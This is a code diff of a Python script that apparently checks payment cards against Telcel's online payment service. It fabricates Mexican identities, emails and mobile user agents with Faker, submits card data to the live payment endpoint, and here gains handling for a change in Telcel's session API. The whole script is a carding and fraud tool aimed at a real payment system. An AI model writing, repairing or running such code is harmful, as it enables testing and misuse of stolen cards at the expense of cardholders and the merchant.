@@ -45,7 +45,7 @@ def get_montos(monto):
 ###########№########################################
 fake = Faker("es_MX")
 get_ua = lambda: UserAgent(platforms='mobile').random
-email = lambda: f"{fake.user_name()}@{random.choice(["gmail.com", "yahoo.com", "live.mx", "outlook.com"])}"
+email = lambda: f"{fake.user_name()}@{random.choice(['gmail.com', 'yahoo.com', 'live.mx', 'outlook.com'])}"
 post_code = random.randint(10000, 16999)
 
 def _json(res: requests.Response):
@@ -89,6 +89,14 @@ def main(ccs, monto, num):
             _j = _json(res)
             sessionid = _j.get("sessionId")
             web_sess = _j.get("webSession")
+            # El endpoint de Telcel cambió: ya no devuelve sessionId/webSession en JSON,
+            # sino un JWT. Si no vienen, abortamos con mensaje claro en lugar de mandar
+            # null a confirmOrder y provocar el 500 NPE de VestaRequestConfirmDto.getSessionKey().
+            if not sessionid or not web_sess:
+                return {"number": num, "monto": monto, "status": "Error ⚠️",
+                        "message": f"Telcel no devolvió sessionId/webSession — API cambió. "
+                                   f"token_resp={token1[:80]!r} parsed={list(_j.keys())[:5] or 'none'}",
+                        "card": ccs.strip()}
             headers = {"sec-ch-ua-platform": "\"Android\"", "authorization": f"Bearer {token1}",  "sec-ch-ua-mobile": "?1",  "user-agent": ua, "accept": "application/json, text/plain, */*", "content-type": "application/json", "sec-gpc": "1", "accept-language": "es-MX,es;q=0.6",  "origin": "https://paymentservice.telcel.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://paymentservice.telcel.com/payments/", "accept-encoding": "gzip, deflate, br, zstd", "priority": "u=1, i"}
             encDta= build(ccs); numc=encDta.get("token", ""); cvv=encDta.get("cvv", "");type=encDta.get('type','')
             resultm = get_montos(int(monto))
